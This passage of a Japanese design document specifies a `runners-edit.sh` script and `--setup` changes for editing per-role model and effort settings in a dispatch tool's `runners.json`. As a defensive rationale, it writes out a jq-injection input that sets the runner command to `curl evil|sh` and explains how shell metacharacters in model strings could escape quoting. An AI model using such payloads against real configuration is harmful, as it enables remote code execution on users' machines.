# cmux-team-dispatch-task `--setup` での役割別 model / effort 設定の設計

対象: `apps/cmux-team-dispatch-task`

## 背景

`runners.json` の runner レコードは v1.20.0 以降、役割ごとの model と effort を
6 つの任意フィールドとして持つ。

| フィールド | 役割 |
|---|---|
| `plan_model` / `plan_effort` | design（plan / superpowers / prewarm design standby） |
| `review_model` / `review_effort` | review（Phase A-R / Phase B-R のレビューペイン） |
| `exec_model` / `exec_effort` | exec（execute / executor standby） |

この 6 フィールドは **engine 中立**で、claude runner でも codex runner でも同じ名前で
解決される。解決順序も既定値も既に実装済みで、`launch-workspace.sh` /
`prewarm-panes.sh` / `--override` のすべてがこれを読む。

欠けているのは**書き込み側だけ**である。値を入れる経路は 2 つしかない。

1. **First-run setup** — `runners.json` が存在しないときにだけ走る。既に登録された
   runner のフィールドを後から変えることはできない。
2. **JSON の手編集** — `~/.claude/cmux-team-dispatch-task/runners.json` を直接開く。

`--setup` は runner（`design_runner` / `review_runner` / `exec_choice`）を選ばせるが、
その runner が**どのモデルでどの effort で動くか**は選ばせない。「レビューだけ effort を
上げたい」「exec を `fable` にしたい」といった、最も頻度の高い調整が `--setup` から
到達できない。

## 目的

`--setup` から、登録済み runner の **3 役割 × 2 次元 = 6 フィールドすべて**を設定・変更・
既定へ戻すことができるようにする。JSON の手編集を不要にする。

## 非目標

以下は明示的に扱わない。

- 解決ロジック・既定値・優先順位の変更。`launch-workspace.sh` / `prewarm-panes.sh` /
  `--override` は 1 行も変えない。
- `config.json` への新キー追加。model / effort は `runners.json` に属し、config の
  役割キー 5 つ（`design_runner` / `review_runner` / `exec_choice` / `review_mode` /
  `prewarm`）は不変。
- runner の追加・削除、`name` / `command` / `engine` / `default` の変更。これらは
  First-run setup と `--reset runners` の担当のまま。
- **First-run setup の書き込み経路を新スクリプトへ移行すること。** 現行のまま動いており、
  触れば回帰リスクだけが増える。この結果、`runners.json` の**新規作成と再構築は今後も
  スクリプトを通らない**。§1.5 と §3 の見出し文言はこの事実と矛盾しないよう書く。
- 1 回の `--setup` で複数の runner を編集すること。M1 は単一選択で、2 件目は `--setup`
  を再実行する。`multiSelect` にすると M2 / M3 の選択肢が runner ごとに変わり、
  3 コール構成が崩れる。
- `--setup` の排他規則（`--loop` / `--reset` / `--override`）と「ディスパッチしない」
  性質の変更。
- バージョン番号の bump、push、PR 作成。

## 前提として守る事実

| 項目 | 内容 |
|---|---|
| 未設定時の既定 model | plan: claude `opus[1m]` / codex なし、review: claude `opus[1m]` / codex は reviewer に選ぶなら必須、exec: claude `sonnet` / codex なし |
| 未設定時の既定 effort | plan `xhigh` / review `xhigh` / exec `high`（両 engine 共通） |
| effort allowlist | claude `low\|medium\|high\|xhigh\|max`、codex `minimal\|low\|medium\|high\|xhigh`。**codex に `max` は決して出さない** |
| model 文字列 | **モデル名の allowlist は作らない**（新しいモデル名がそのまま通ること）。ただしシェルメタ文字は拒否する。§1.3 と「タスク指示からの意図的な逸脱」節を参照 |
| AskUserQuestion 上限 | 1 コール 4 問、1 問 4 選択肢。"Other" 自由入力欄は自動で付き、この 4 枠を消費しない |
| 原子的書き込み | writer 固有 `mktemp` + `jq` + jq 成功時のみ `mv`。他コンポーネント所有のキーを消さない |

**解決順序の帰結（設計上きわめて重要）**: `launch-workspace.sh` の解決は
「明示 `--model` / `--effort` > runner フィールド > 既定値」なので、
**claude の model と両 engine の effort では「既定値を明示的に書く」と「フィールドを削除する」
の実効値が完全に一致する**。実効差があるのは codex の `plan_model` / `exec_model` だけ
（未設定 = `--model` を付けない = codex 側デフォルト）。§2.4 の選択肢生成はこの事実に
基づく。

`config.json` の `shell_ready_ms`（`terminal-wait.sh` 所有）が生き残らねばならないのと
同じ理由で、`runners.json` でも「編集対象でない runner」「編集対象でないフィールド」
「`default` キー」が生き残らねばならない。

---

## 設計

### 1. 書き込み口 — 新規スクリプト `skills/cmux-team-dispatch-task/scripts/runners-edit.sh`

`runners.json` への**フィールド単位の更新**は、`config-edit.sh` と同一の契約を持つ
**専用スクリプト**を新設して一本化する。

パスは `config-edit.sh` と同じ `skills/cmux-team-dispatch-task/scripts/` 配下。
ドキュメント中の呼び出しは `<SKILL_DIR>/scripts/runners-edit.sh` と書く
（`apps/cmux-team-dispatch-task/scripts/` は `claude-link.sh` 専用で、こちらではない）。

#### 1.1 なぜ新規スクリプトなのか

3 案を検討した。

| 案 | 判定 | 理由 |
|---|---|---|
| **新規 `runners-edit.sh`** | **採用** | 対象ファイル・スキーマ・検証ドメインのいずれも `config.json` と別物。`config-edit.sh` と同型の契約を持たせれば、読む側の認知負荷は増えない |
| `config-edit.sh` を拡張 | 却下 | `known_key` / `valid_value` の「5 キー allowlist」モデルと `--config` という引数名が壊れる。単一オブジェクトのキー更新と配列要素の部分更新という別種の操作が 1 スクリプトに混ざり、`test-config-edit.sh` CE5「未知キーは exit 2」契約とも衝突する |
| SKILL.md / setup-mode.md にインライン jq | 却下 | `setup-mode.md` 自身の「Never hand-assemble a jq invocation for these files」に真正面から反する。`config-edit.sh` が生まれた動機（呼び出しごとに jq を組み立て直すことで起きるマージ漏れ）は、配列要素の部分更新ではさらに深刻になる |

新規スクリプトにしかできないことが 2 つある。

1. **effort の検証に必要な `engine` は編集対象レコード自身に書いてある。** スクリプトなら
   `--set plan_effort=max` を受け取った時点でレコードから `engine` を読み、codex runner
   なら `max` を弾ける。インライン jq では「呼び出し側が engine を正しく渡す」ことを
   毎回祈ることになる。
2. **値を jq プログラム文字列へ補間しない保証**（§1.4）を、テスト可能な 1 箇所に
   閉じ込められる。

#### 1.2 インターフェース

```
runners-edit.sh --runners <path> --name <runner> [--set <field>=<value>]... [--unset <field>]... [--dry-run]
runners-edit.sh --runners <path> --name <runner> --get <field>
runners-edit.sh --runners <path> [--name <runner>] --show
```

`config-edit.sh` の `--config` / `--set` / `--unset` / `--get` / `--show` と対応する。
追加は `--name`（対象レコード）と `--dry-run`（S6 のプレビュー用）の 2 つだけ。

| 引数 | 意味 |
|---|---|
| `--runners <path>` | 対象 `runners.json`。既定の場所は `~/.claude/cmux-team-dispatch-task/runners.json` だが、パスは呼び出し側が渡す（テスト可能性のため） |
| `--name <runner>` | 対象 runner の `name`。`--set` / `--unset` / `--get` では**必須**。一致件数が 1 でなければ exit 2 |
| `--set <field>=<value>` | フィールドを設定（繰り返し可） |
| `--unset <field>` | フィールドを削除 = 既定へ戻す（繰り返し可）。不在フィールドでも exit 0（冪等） |
| `--dry-run` | `--set` / `--unset` と併用。**書き込まず**、適用後の JSON 全体を stdout へ出す。S6 の after 表示はこれで作る |
| `--get <field>` | 値を stdout へ。未設定なら空文字で exit 0 |
| `--show` | `--name` 併用でそのレコードだけ、省略時はファイル全体を整形出力 |

`--dry-run` を足す理由は §2.5 にある。これが無いと S6 の「after」を作るために呼び出し側が
jq を手で組み立てることになり、同じファイルの
`Never hand-assemble a jq invocation for these files` と正面衝突する。

#### 1.3 検証

**フィールド allowlist**（これ以外は exit 2）:

```
plan_model  review_model  exec_model  plan_effort  review_effort  exec_effort
```

`name` / `command` / `engine` / `default` は allowlist に**入れない**。この
スクリプトは runner の同一性には触らない。

**値の検証**:

- `*_model` — 次の 2 条件のみ。**モデル名の allowlist は作らない。**
  1. 非空文字列であること（空値は下流で `--model ''` になり壊れる）。
  2. `'` `"` `` ` `` `$` `\` および制御文字（改行 / CR / タブ）を含まないこと。
     違反は exit 2。根拠は §1.3.1。
- `*_effort` — レコードの `engine` を読み、engine 別 allowlist と照合する。
  - `engine: claude` → `low` / `medium` / `high` / `xhigh` / `max`
  - `engine: codex` → `minimal` / `low` / `medium` / `high` / `xhigh`
  - 範囲外は exit 2。**codex に `max` を渡すと必ず失敗する。** codex が `max` を
    受け付けるかは確認されていないので、安全側の分岐を維持する。
  - `engine` がレコードに無い、または上記 2 値以外のときは exit 2（どちらの
    allowlist を適用すべきか決められないため、黙って通さない）。

**構造の検証**:

- `.runners` が配列でなければ exit 2。`.runners |= map(…)` はオブジェクトを配列へ
  黙って化けさせるので、型崩れをここで止める。
- `--name` に一致する `runners[]` 要素の件数がちょうど 1 でなければ exit 2
  （0 件 = 未登録、2 件以上 = 重複。`runners.json` は `name` の一意性を機械的に
  強制していないので、両方書き換えるより止める方が安全）。

**引数の相互作用**:

- モード排他 — `--set`/`--unset` 群 / `--get` / `--show` のうち、ちょうど 1 つだけを
  指定する。混在は exit 2。モード未指定も exit 2。`--runners` 未指定も exit 2。
- 同一フィールドへの `--set` と `--unset` の同時指定は exit 2（jq 合成順に結果が
  依存するため、曖昧なまま通さない）。
- `--dry-run` は `--set`/`--unset` モード専用。`--get` / `--show` との併用は exit 2。

##### 1.3.1 `*_model` でシェルメタ文字を拒否する理由

タスク指示は「モデル文字列は検証しない」と述べており、この規則はその**意図された
範囲（モデル名を allowlist しない）を守りつつ、シェル注入だけを塞ぐ**ものである。
逸脱の扱いは末尾の「タスク指示からの意図的な逸脱」節に記録する。

model 文字列は `launch-workspace.sh` で
`CLAUDE_MODEL_FLAGS="--model '$MODEL'"`（codex は `CODEX_MODEL_FLAG=" --model '$MODEL'"`）
として組まれ、`SESSION_CMD="zsh -ic \"$CORE_CMD\""` の**二重引用の内側**に入る。
二重引用の内側では単一引用が引用として機能しないため、model 中の `'` / `` ` `` /
`$(…)` は展開・脱出しうる。

`--setup` はこの値を **`runners.json` へ永続化する**ので、一度入ると以後の全ディスパッチで
再実行される。実在するモデル名は `[A-Za-z0-9._\[\]/-]` の範囲に収まる（`opus[1m]` /
`sonnet` / `fable` / `gpt-5.6-sol` / `gpt-5.6-terra`）ので、この拒否条件は既存値も
将来のモデル名も壊さない。

同種の防御はこのリポジトリに先例がある。ルート `CLAUDE.md` 保守手順 27 は
`parallel-directive.sh` の出力に `'` `"` `` ` `` `$` `!` `\` を 1 文字も含めない規約を持ち、
`test-parallel-directive.sh` PD4 がそれを検査している。

**既知の限界**: First-run setup と `--override` も model を自由入力で受けるが、そちらは
非目標により変更しない。したがってこの防御は `runners-edit.sh` 経由の書き込みに限られる
（新設する永続化経路を無防備にしないことが目的で、既存経路の穴を全部塞ぐことは
このタスクの範囲外）。

#### 1.4 実行順序と書き込み

**検証はすべて `mktemp` より前に完了する。** これを明文の不変条件とする。

```
0. 引数パース。フィールド allowlist / モード排他 / --set と --unset の衝突 /
   --dry-run の併用可否 を検証（ファイル非依存）
1. [[ -f "$RUNNERS" ]] を確認。
   - --set / --unset モード: 通常ファイルでなければ exit 2 (§1.5)
   - --get / --show モード: 不在なら空 / {} を出して exit 0 (§1.5)
   ※ -e ではなく -f を使う。-e だとディレクトリを渡したとき rc=0 で偽成功する
2. jq . "$RUNNERS" で parse。失敗は exit 1（元ファイル無傷）
3. (.runners | type) == "array" を検証。違反は exit 2
4. --name の一致件数がちょうど 1 であることを検証。違反は exit 2
5. レコードの engine を読み、*_effort を engine 別 allowlist と照合。違反は exit 2
6. ここで初めて TMP=$(mktemp "$RUNNERS.XXXXXX")
7. 全 --set / --unset を単一の jq 式へ合成し、1 回の jq 実行で $TMP へ書く
8. --dry-run なら $TMP を cat して rm -f し、書き込まず exit 0
9. jq 成功時のみ mv。mv 自体の失敗も扱う（下記）
```

手順 0〜5 が `mktemp` より前にあることで、検証エラー（exit 2）のたびに temp が
残る事故を構造的に防ぐ。手順 1 が exit 2 のとき親ディレクトリを作らないので、
`config-edit.sh` にある `mkdir -p "$(dirname …)"` は**置かない**（§1.5 によりファイルは
必ず存在するので不要であり、置くと RE13 の経路で空ディレクトリだけ作る副作用が出る）。

**jq への値の渡し方（セキュリティ上 load-bearing）**:

- `--set` の値は必ず `--arg vN` で渡す。`*_model` も `*_effort` も文字列なので
  `--argjson` は使わない。**値を jq プログラム文字列へ連結してはならない。**
- `--name` も `--arg n` で渡す。
- フィールド名は §1.3 の allowlist に一致した場合に**のみ** `.${field}` として式へ埋める。
  `config-edit.sh:99` と同型の根拠コメント（「フィールド名は allowlist 済みなので
  jq 式へ直接埋めてよい」）を実装に残す。

これを守らないと、`--set plan_model='x", "command": "curl evil|sh'` 相当の入力で
allowlist から意図的に外した `.command` を書き換えられる。`.command` は
`launch-workspace.sh` の `CORE_CMD="$RUNNER_COMMAND …"` で**クォート無し**に連結され
（zsh 関数を runner にできる設計なので意図的）、`zsh -ic "…"` で実行されるため、
次回ディスパッチで任意コマンドが走る。

jq 式は対象 runner だけを写像する形にする。他の要素はそのまま通す。

```
.runners |= map(if .name == $n then (.plan_effort = $v1 | del(.exec_model)) else . end)
```

これにより次が保証される。

- 他の runner レコードは 1 バイトも変わらない
- `default` キーおよびトップレベルの未知キーが残る
- 編集対象レコード内の、allowlist 外のフィールド（`name` / `command` / `engine` や
  将来追加されるフィールド）が残る = **置換ではなくマージ**

**`mv` 失敗と後始末**:

```bash
TMP=""                                  # set -u 下なので事前初期化が必要
trap 'rm -f "${TMP:-}"' EXIT
...
mv "$TMP" "$RUNNERS" || {
  rm -f "$TMP"
  echo "runners-edit: move failed; $RUNNERS is unchanged" >&2
  exit 1
}
TMP=""                                  # 成功後は trap を無害化
```

`config-edit.sh` の `mv` は最終行で無防備（`set -e` 任せ）なため、immutable 属性や
read-only ディレクトリでは temp が残りスクリプト固有の診断も出ない。新規スクリプトでは
これを繰り返さない。`trap` は mktemp 〜 mv 間の SIGINT / SIGTERM も拾う。

**exit code**: 0 成功 / 1 書き込み・読み取り失敗（ファイルは変更されない）/
2 usage・検証エラー。コードの意味は `config-edit.sh` と同一で、**ファイル不在時の
書き込みモードの扱いだけが意図的に異なる**（§1.5）。

**明記しておく既存挙動（`config-edit.sh` と同一、新規退行ではない）**:

- `mv` は `rename(2)` なので **temp の mode が残り、原ファイルの mode は失われる**
  （`chmod 644` → `600`）。締める方向なのでセキュリティ劣化ではないが、`chmod 444` に
  よる凍結も無言で解除される。
- `runners.json` が symlink のとき、**symlink が通常ファイルに置き換わり、リンク先は
  元のまま**になる。dotfiles からレジストリを symlink する構成では乖離する。
- 読み取りから書き込みまでの read-modify-write 全体は原子的ではない。`rename` の
  原子性が保証するのは「中間状態が観測されない」ことだけで、**並行書き込みは
  last-write-wins** になる。`apps/cmux-team-dispatch-task/CLAUDE.md` 保守項目 19 が
  config.json について同じことを明記しており、文言を揃える。

いずれも `config-edit.sh` と同じ挙動なので、この 3 つは**ドキュメントに書くだけで
実装では変えない**（symlink 解決や排他ロックを新スクリプトにだけ入れると、2 つの
edit スクリプトの挙動が非対称になる）。

#### 1.5 ファイルが存在しない場合

**モードで分ける。**

| モード | ファイル不在時 |
|---|---|
| `--set` / `--unset`（`--dry-run` 含む） | **exit 2**。レジストリを新規作成しない |
| `--get` | 空文字を出して exit 0（`config-edit.sh:134` と同じ） |
| `--show` | `{}` を出して exit 0（`config-edit.sh:143-146` と同じ） |

書き込みで exit 2 にするのは「登録済み runner を編集する」という前提が崩れるため。
レジストリの新規作成は First-run setup の責務であり、この分岐を読み取りモードへ
広げると **S1（現状表示）が `runners.json` 未作成の状態で `--show` を呼べなくなる**。
S1 は S3 の分岐より前に必ず走るので、読み取りは非破壊で exit 0 でなければならない。

---

### 2. `--setup` フローの変更

runtime SoT は `references/setup-mode.md`（日本語ミラー `setup-mode-ja.md`）。

#### 2.1 S1 — 現状表示

現行のレジストリ表は name / command / engine + model の 4 列。effort 3 列を足すと
9 列になり、Box drawing 禁止のこの画面では横に溢れる。**転置形**を指定する。

```
runner: ccenec  (command: ccenec, engine: claude)

| role   | model            | effort          |
|--------|------------------|-----------------|
| plan   | opus[1m]         | max             |
| review | default (opus[1m]) | default (xhigh) |
| exec   | fable            | default (high)  |
```

- 1 runner = 見出し 1 行 + 3 行の表。未設定は空欄ではなく `default (<値>)` と表示して
  実効値が読めるようにする。このラベル形式は First-run setup（`SKILL.md:469-472` の
  `default (xhigh)` など）の先例と一致する。
- **役割キーの `unset` 表示とは表記が違うが、これは正当な区別である。** 役割キーは
  三値（固定値 / `"ask"` / 未設定）なので状態そのものを見せる必要があり `unset` と書く。
  runner フィールドは二値（設定済み / 未設定）で、未設定でも実効値が決まっているので
  実効値を見せる方が有用。
- **例外**: codex runner の `review_model` が未設定のときは `default (codex-side)` では
  なく **`unset (not review-capable)`** と表示する。codex reviewer は `review_model` が
  必須で、未設定は「既定にフォールバックする」ではなく「reviewer に選べない」を意味する
  （§2.4 の M1 警告と対になる）。

#### 2.2 S2 — 質問コール①

Q2「対象」は現行 3 択（役割キーのみ / `runners.json` のみ / 両方）。**選択肢の数と
意味は変えず、3 つすべてのラベルと説明を model / effort が含まれることが分かる形に
そろえる。**

| # | 現行ラベル | 変更後 |
|---|---|---|
| 1 | 役割キーのみ | `the role keys only` — description に「per-role models and efforts live in the registry; pick option 2 or 3 to reach them」を付ける |
| 2 | `runners.json` のみ | `the runner registry (models and efforts included)` |
| 3 | 両方 | `both — the role keys and the registry (models and efforts included)` |

model / effort は `runners.json` の中身なので、対象を 4 つへ増やすと「`runners.json` と
モデル設定の違いは何か」という無意味な区別を利用者に強いる。ラベルと説明だけで
発見可能性を補い、選択肢 1 を選んだ利用者にも到達経路を伝える。

#### 2.3 S3 — `runners.json`（対象に含まれるときだけ）

ファイルが存在するときの選択肢を 3 択から 4 択にする。

| # | 選択肢 | 動作 |
|---|---|---|
| 1 | 追加 | 既存どおり First-run setup の対話で 1 件足す |
| 2 | **登録済み runner の model と effort を編集** | **新規。S3-M へ** |
| 3 | 作り直し | 既存どおりレジストリを再構築 |
| 4 | そのまま | 既存どおり何もしない |

ちょうど AskUserQuestion の 4 選択肢上限に収まる。

**S3-M へ到達しない経路も明記する。**

- **ファイル不在時** — 従来どおり First-run setup が走る。First-run setup は
  6 フィールドをその場で収集するので、S3-M は提示せず S4 へ向かう。
- **選択肢 1（追加）/ 3（作り直し）の後** — 同じ理由で S3-M は提示せず S4 へ向かう。
  追加した runner を続けて編集したい場合は `--setup` を再実行する。
- **1 回の `--setup` で編集できる runner は 1 件**（M1 は単一選択）。

#### 2.4 S3-M — model / effort エディタ（新規）

S3 で選択肢 2 を選んだときだけ走る。**happy path で AskUserQuestion 3 コール**
（再質問が発生すると最大 +2）。

このサブセクション配下の下位見出しは **`####` を使う**。SU8 は
`^#\{1,3\} ` を数えるので `####` はカウント対象外であり、英日で見出しレベルまで
一致させれば SU8 は S3-M の追加 1 個だけを見る。

##### M1. どの runner か（1 問）

選択肢は `runners[]` のエントリ（label = `name`、description = `command (engine)`）。
登録が 5 件以上なら**先頭 4 件を出し、残りは自動 "Other" 自由入力**で受ける。これは
S5 の `design_runner` 選択（`setup-mode.md` の「offer the first four」）が既に使っている
逃がし方であり、新しいパターンを発明しない。

> `--override` の Call 1 は「先頭 **3** 件 + Other」で数え方が違う（`SKILL.md:828-831`）。
> リポジトリ内で規約が割れているので、先例としては S5 だけを引く。

"Other" に登録されていない名前が入力されたら、警告して同じ質問を**もう一度だけ**出す。
2 回目も未登録なら S3-M を中止して S4 へ進む（無限ループにしない。effort 側の
再質問規定と対称）。**新規 runner は作らない**（runner の追加は S3 の選択肢 1 の担当）。

##### M2. model 3 問（1 コール）

`plan_model` / `review_model` / `exec_model` を 1 コールで聞く。

##### M3. effort 3 問（1 コール）

`plan_effort` / `review_effort` / `exec_effort` を 1 コールで聞く。

##### 役割単位ではなく次元単位にした理由

`--override`（Step 1g-2）は「どの役割か」を先に聞いてから役割ごとに 1 コールを出す。
ここでは採らない。

- `--override` はタスクごとに engine が変わりうるので役割単位が自然だが、`--setup`
  では**編集対象の runner が 1 つに固定**されており、6 フィールドすべてが同じ engine
  で解釈される。役割ごとに分ける理由がない。
- 各問の第 1 選択肢が常に「変更なし」なので、「この役割は触らない」は選択肢 1 で
  表現できる。役割選択の前置き質問は情報を増やさない。
- 結果として M1 + M2 + M3 の **3 コール**になる。`--override` を 1 タスク・全 3 ロールに
  適用したときが 5 コール（Call 1 + Call 2 + Call 3×3）なので、同条件で 2 コール少ない。

##### 選択肢の組み立て（静的な表ではなく動的規則）

**静的な選択肢表は作らない。** 既定値を明示的に書くこととフィールドを削除することが
実効同値になる組み合わせが多く（「前提として守る事実」の解決順序の帰結を参照）、
表に固定すると 4 枠のうち 1〜2 枠が常に死ぬ。First-run setup（`SKILL.md:469-472`）も
重複なしで組んでいる。

各問は次の規則で組み立てる。

1. **opt1 = 変更なし。** 現在値が設定済みなら `keep (<current>)`、未設定なら
   `keep (default: <effective default>)`。
2. **opt2 以降 = 候補プールから順に埋める。** プールから
   **現在値**と**実効既定値**を除外したうえで、先頭から順に取る。
3. **最終枠 = 現在値が設定済みのときだけ `clear (use the default: <d>)`。**
   未設定のときはその枠も候補で埋める。
4. 4 枠に収まらない候補は自動 "Other" 自由入力から到達できる。**ダミーの選択肢は
   置かない。**

**候補プール**（engine 別、この順序）:

| 対象 | プール |
|---|---|
| claude `*_model` | `opus[1m]` / `sonnet` / `fable` |
| codex `*_model` | §「codex model 候補の導出」参照 |
| claude `*_effort` | `max` / `xhigh` / `high` / `medium` / `low` |
| codex `*_effort` | `xhigh` / `high` / `medium` / `low` / `minimal` |

**`max` は claude のプールにしか無い。** codex 側のどの経路（プール / 既定 / "Other"
の受理）にも現れない。

例（claude runner、`plan_effort` が未設定 = 実効既定 `xhigh`）:
`keep (default: xhigh)` / `max` / `high` / `medium`（`xhigh` は既定なので除外、
`low` は枠外で "Other" 送り）。

例（claude runner、`plan_effort: "max"`）:
`keep (max)` / `xhigh` / `high` / `clear (use the default: xhigh)`
（`max` は現在値なので除外）。

**文言はリポジトリの隣接機能に揃える。** `--override` は `SKILL.md:842` で
`keep (<resolved …>)`、`README.md` の日本語は「変更なし（現在: `<解決値>`）」。
英語版は `keep (…)` / `clear (…)`、日本語版は「変更なし（現在: `<v>`）」/
「変更なし（既定: `<d>`）」/「既定に戻す（`<d>`）」で統一し、codex model の行だけ
語形が変わることのないようにする。

##### codex model 候補の導出

`runners.json` 全体に出現する codex model 文字列（`engine: codex` のレコードに属する
`plan_model` / `review_model` / `exec_model` の値）を集め、次の順序で確定する。

1. **編集中の当該フィールドの現在値を除外**する（除外しないと opt1 と重複する）。
2. 重複除去し、`runners[]` の**登録順**（同一 runner 内では
   `plan_model` → `review_model` → `exec_model` の順）に並べる。
3. 枠が余ったら First-run setup の先例（"for codex offer free text (e.g. `gpt-5.6-sol`)"）
   に従い `gpt-5.6-sol` を 1 件だけ補充する（既にプールにあれば補充しない）。
4. それでも枠が余ったら**枠を減らす**。AskUserQuestion の最低 2 選択肢は
   opt1（変更なし）+ 1 件で満たせる。ダミーは置かない。

##### codex `review_model` を unset するときの警告

codex reviewer は `review_model` が必須で、未設定のまま reviewer に選ばれると
`prewarm-panes.sh` が

```
die "codex reviewer runner '<name>' requires review_model"
```

で**起動時に落ち、ディスパッチそのものが失敗する**。`--setup` の数日後に踏むと
原因に辿り着く手がかりが無い。3 段で防ぐ。

- **(a) S1** — codex runner の `review_model` 未設定は `unset (not review-capable)` と
  表示する（§2.1）。
- **(b) M2** — codex `review_model` の `clear (…)` 選択肢の description に
  「this runner can no longer be chosen as the reviewer」と書く。
- **(c) S6** — unset した結果その runner が現在の `review_runner`（project / global の
  どちらか）だった場合は、S6 の警告リストに載せる。

##### 自由入力の扱い

- **effort の "Other"** — engine 別 allowlist と照合する。範囲外なら警告して
  **その 1 問だけ**を再質問する（1 回まで）。2 回目も範囲外ならそのフィールドは
  変更せず、警告を S6 のプレビューへ持ち越す。`--setup` は永続化するので、
  `--override` のように黙って既定へフォールバックすると「入力した値と違う値が
  保存される」ことになり、あとから気づけない。
- **model の "Other"** — モデル名としては検証しないが、§1.3 のシェルメタ文字条件は
  適用される。違反したら警告してその 1 問だけを再質問する（1 回まで。effort と対称）。
- **空文字** — どちらの次元でも「変更なし」として扱う。

#### 2.5 S6 — プレビューと確認

プレビューが 2 ファイル分になる。

- `config.json` の before / after（既存どおり）
- `runners.json` は**編集対象の runner レコードだけ**の before / after。ファイル全体を
  出すと登録数に比例して長くなり、差分が埋もれる。
  - **before** は `runners-edit.sh --show --name <runner>`。
  - **after** は `runners-edit.sh --dry-run` に S7 と**同一の `--set` / `--unset` 群**を
    渡して得た JSON から当該レコードを抜く。呼び出し側が jq を組み立てないことが
    `Never hand-assemble a jq invocation for these files` を守る唯一の方法である。

S3-M で持ち越した警告（effort / model の "Other" 再入力失敗、codex `review_model` の
unset）があればここに列挙する。確認は従来どおり「書き込む / 中止」の 1 問。中止は
何も書かない。

#### 2.6 S7 — 書き込み

**現行 S7 の置き換えではなく、1 番目のステップとして挿入する。** 現行 S7 が持つ
次の 2 つは温存する（どちらも SU3 / SU5 の grep 対象ではないため、消えてもテストが
落ちない）。

- `For the project destination, mkdir -p .dispatch first.`
- `If the destination was the project layer, tell the user it now shadows the global
  layer for this repository.`

改訂後の順序:

```
1. runners-edit.sh を最大 1 回（全 --set / --unset を 1 コールに載せる）
2. プロジェクト書き込み先なら mkdir -p .dispatch   ← 既存
3. config-edit.sh  を最大 1 回（全 --set / --unset を 1 コールに載せる）  ← 既存
4. 双方を --show で表示する
5. プロジェクトレイヤーへ書いたならシャドウの旨を伝える   ← 既存
```

**レジストリを先に書く**。役割キー（`design_runner` など）は runner を名前で参照するので、
config を書く時点でレジストリ側が確定している方が読み手にとって自然である。ここでは
runner の追加も削除もしないので順序が結果を変えることはないが、順序を決めておくこと
自体に価値がある。

**2 ファイルは 1 トランザクションではない**ことを明記する。各呼び出しは個別に原子的
だが、両者をまたぐ原子性は無い。**どちら向きの失敗でも、成功した分を報告したうえで
残りの完全なコマンドラインを提示して停止する。**

- 手順 1 が失敗 → 手順 3 を実行せず、`config-edit.sh` の完全なコマンドラインを提示。
- 手順 3 が失敗 → 手順 1 が成功済みである旨を伝え、`config-edit.sh` の完全な
  コマンドラインを提示。

**シェルのクォート規約**: `--set` の値には自由入力の model 文字列が載る。空白で引数が
割れ、`'` でクォートが破れる。`setup-mode.md` / `setup-mode-ja.md` に追加する記述例は
必ず単一引用付きにする。

```bash
bash <SKILL_DIR>/scripts/runners-edit.sh --runners <path> --name 'ccenec' \
  --set 'plan_model=opus[1m]' --set 'plan_effort=max' --unset exec_model
```

---

### 3. ドキュメント同期

`apps/cmux-team-dispatch-task/CLAUDE.md` の 4 ファイル整合ルールと、`setup-mode.md` /
`setup-mode-ja.md` のミラー規則の両方に従う。**節単位で列挙する**（ファイル名だけだと
stale になる節が漏れる）。

| ファイル | 節 | 変更 |
|---|---|---|
| `references/setup-mode.md` | S1 / S2 / S3 / S6 / S7 | 本設計 §2 のとおり改訂 |
| 〃 | `### S3-M`（新設） | 下位見出しは `####` |
| 〃 | `## All writes go through \`config-edit.sh\`` | 改題（下記 3.1） |
| `references/setup-mode-ja.md` | 同上すべて | 同一構造・**同一見出しレベル**の日本語版 |
| `SKILL.md` | `## Setup Mode` | 「役割別 model / effort も設定できる」旨を 1 文追加 |
| 〃 | `Both modes write exclusively through …` の 1 文 | 下記 3.1 の文言へ |
| 〃 | **First-run setup 見出し（`SKILL.md:433-434`）** | 現行は `(when runners.json does not exist, …, and when --setup selects the registry as a target)`。S3 に選択肢 2 が増えると「レジストリを対象に選んだ = First-run setup が起動する」が偽になるので、選択肢 1 / 3 に限る旨へ改める |
| `references/guide-ja.md` | `## セットアップモード` 節 | SKILL.md 変更の 1:1 訳 |
| 〃 | **`### 設定（--setup）`（`guide-ja.md:1363`）** | `README.md:84-98` の逐語ミラー。README だけ直すと 4 ファイル整合違反。SKILL.md 由来ではないので「1:1 訳」では拾えない |
| 〃 | **`### 初回セットアップ`（`guide-ja.md:1643`）** | 「…または `--setup` で `runners.json` を対象に選んだときは、初回セットアップが起動します」が同じ理由で偽になる |
| `README.md` | `### 設定（--setup）` | model / effort 設定を追記 |
| `apps/cmux-team-dispatch-task/CLAUDE.md` | ファイル構成表 | `runners-edit.sh` を追加 |
| 〃 | 保守手順 28 | `runners-edit.sh` の契約・新テスト名・`setup-mode.md` の SU12 依存行形式の維持義務を追加 |
| 〃 | 保守手順 44 の近く | §2.4「次元単位 vs 役割単位」と effort 範囲外時の挙動差（`--override` は警告して既定へフォールバック / `--setup` は再質問）を**意図的な差**として 1 行残す |
| 〃 | 「テスト方法」E2E 項目 43 | 現行の「現在の設定表 → 書き込み先/対象 → 役割キー → 差分確認」に S3-M のケースを追記（§4.3 の限界と対） |

**変更不要と確認済み**（誤って足さないこと）: `.codex-plugin/plugin.json` /
ルート `.claude-plugin/marketplace.json`（version のみ保持、非目標により対象外）、
`references/loop-mode*.md` / `references/unattended/*.md`（`--setup` も `config-edit.sh`
も出現しない）、`docs/notification-gaps.md`。

#### 3.1 「All writes go through …」の改題

見出しを `## All writes go through the edit scripts` にするだけでは**偽になる**。
`setup-mode.md` の Scope 表は `runners.json` を含むので、改題後の見出しは
「`--setup` / `--reset` のすべての書き込みは 2 つの edit スクリプトを通る」と読めるが、

- First-run setup は `runners.json` を**自分で書く**（`SKILL.md:487`。非目標により変更しない）
- `--reset runners` は `rm -f "$RUNNERS_JSON"` + First-run setup で、`runners-edit.sh` を
  一切呼ばない
- `runners-edit.sh` はファイル未存在なら exit 2 で、新規作成しない（§1.5）

真に受けた将来の実装者が First-run setup を `runners-edit.sh` に寄せると、exit 2 で
永久にレジストリを作れないデッドロックになる。**主語を field-level 更新に絞り、
例外を 1 文で明記する。**

> The two edit scripts own every **field-level** update. Creating `runners.json` from
> scratch and rebuilding it stay with First-run setup (SKILL.md Step 1f), which writes
> the file itself; `runners-edit.sh` only edits an existing registry and exits 2 when
> the file is absent.

`setup-mode-ja.md` の対応見出し「## 書き込みは全て `config-edit.sh` を通す」も同時に
改題する。SKILL.md の `Both modes write exclusively through scripts/config-edit.sh` も
同じ限定を付ける（`--reset runners` は 2 スクリプトのどちらも通らないため、
